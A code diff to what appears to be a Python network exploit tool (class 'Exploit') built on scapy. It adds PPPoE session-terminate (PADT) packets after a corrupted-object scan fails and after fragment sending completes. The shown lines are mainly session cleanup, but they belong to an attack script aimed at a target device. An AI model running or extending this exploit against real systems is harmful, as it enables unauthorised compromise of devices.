@@ -775,7 +775,13 @@ class Exploit():
                 ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
 
         if not corrupted:
-            print('[-] Scanning for corrupted object...failed. Please retry.')
+            print('[-] Scanning for corrupted object...failed. Will retry.')
+            print('[*] Sending PADT...')
+            self.s.send(
+                Ether(src=self.source_mac,
+                      dst=self.target_mac,
+                      type=ETHERTYPE_PPPOEDISC) /
+                PPPoED(code=PPPOE_CODE_PADT, sessionid=self.SESSION_ID))
             return
 
         print(
@@ -849,6 +855,12 @@ class Exploit():
         for frag in frags:
             self.s.send(Ether(src=self.source_mac, dst=self.target_mac) / frag)
 
+        print('[*] Sending PADT...')
+        self.s.send(
+            Ether(src=self.source_mac,
+                  dst=self.target_mac,
+                  type=ETHERTYPE_PPPOEDISC) /
+            PPPoED(code=PPPOE_CODE_PADT, sessionid=self.SESSION_ID))
         print('[+] Done!')
 
 
